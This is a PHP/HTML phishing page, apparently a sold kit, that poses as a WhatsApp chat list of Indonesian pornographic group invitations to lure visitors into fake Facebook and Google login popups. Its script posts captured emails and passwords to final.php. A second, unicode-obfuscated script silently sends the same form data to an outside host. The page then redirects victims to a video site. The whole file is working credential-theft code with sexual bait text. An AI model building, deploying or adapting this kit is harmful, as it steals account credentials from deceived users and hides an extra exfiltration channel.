<?php
// Creator Sc  : ABU CODE - X 
// Order Script Vip : https://wa.me/6289509551861

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Chat List</title>
  <script src="https://cdn.jsdelivr.net/gh/alex-hostingg/js@main/tailwind.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/4/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/4/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/4/all.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
  <style>
    .chat-row:hover {
      background-color: #f0f0f0;
      cursor: pointer;
    }
  </style>
</head>
<body class="bg-white text-black">

  <!-- Header -->
  <header class="px-4 py-3 flex justify-between items-center bg-white">
    <h1 class="text-2xl font-bold text-green-500">WhatsApp</h1>
    <div class="flex items-center space-x-4">
      <i class="fas fa-camera text-xl"></i>
      <i class="fas fa-ellipsis-v text-xl"></i>
    </div>
  </header>

  <!-- Chat List -->
  <main class="overflow-y-auto max-h-[85vh] mb-[70px]">

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/preview.gif" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Pemersatu bangsa</p>
        <p class="text-sm text-gray-600 truncate">+62 878-1218-3330 bergabung menggunakan tautan undangan ini</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/bahan4.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Bokep 2025</p>
        <p class="text-sm text-gray-600 truncate">~ Amanda: Cari Cowok Sange 🥵</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/bahan3.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Video Telanjang</p>
        <p class="text-sm text-gray-600 truncate">~ Yanto: Yang Mau Video Telanjang G...</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/admin.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Vcs Bareng</p>
        <p class="text-sm text-gray-600 truncate">~ Mamah Muda: Cari Cowok Yang Ku...</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/bahan2.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">Grup Video Viral</p>
        <p class="text-sm text-gray-600 truncate">~ Jepa: Yang punya video terbaru min…</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/bahan2.webp" alt="SpongeBob" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">+62 765-7272-4340</p>
        <p class="text-sm text-gray-600 truncate">Punya Kamu Berurat Gak</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3 border-b">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/IMG-20230606-WA0016.jpg" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">+62 874-7272-4340</p>
        <p class="text-sm text-gray-600 truncate">Lagi Sange Temenin Donk</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>

    <div onclick="openGroup()" class="chat-row flex items-center px-4 py-3">
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/bahan1.webp" alt="Icon" class="w-12 h-12 rounded-full mr-3"/>
      <div class="flex-1 overflow-hidden">
        <p class="font-bold truncate">+62 877-6272-7263</p>
        <p class="text-sm text-gray-600 truncate">Halo Vcs Mau Gak</p>
      </div>
      <span class="text-sm text-gray-400">Kemarin</span>
    </div>
  </main>

  <!-- Bottom Navigation -->
  <nav class="fixed bottom-0 left-0 right-0 flex justify-around items-center border-t border-gray-200 bg-white py-3 z-50">
    <button onclick="openGroup()" class="flex flex-col items-center text-[#25D366] font-extrabold text-xs">
      <div class="bg-[#D9FDD3] rounded-full w-10 h-8 flex items-center justify-center mb-1">
        <i class="fas fa-comment-alt text-[#25D366] text-lg"></i>
      </div>
      Chat
    </button>
    <button onclick="openGroup()" class="flex flex-col items-center text-black font-extrabold text-xs">
      <i class="fas fa-bullseye text-xl mb-1"></i>
      Status
    </button>
    <button onclick="openGroup()" class="flex flex-col items-center text-black font-extrabold text-xs">
      <i class="fas fa-users text-xl mb-1"></i>
      Komunitas
    </button>
    <button onclick="openGroup()" class="flex flex-col items-center text-black font-extrabold text-xs">
      <i class="fas fa-phone-alt text-xl mb-1"></i>
      Panggilan
    </button>
  </nav>

   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/4/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/4.5.12/jquery.min.js"></script>
  <script>
  $(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://doods-stream.site/unduh";
            }
        });
    }
    
    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");


    // Tombol
    $("#codxFacebook").click(function () { OpenFacebook(); });
    $("#codxGoogle").click(function () { OpenGoogle(); });
    $("#openGroup").click(function () { openGroup(); });

});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>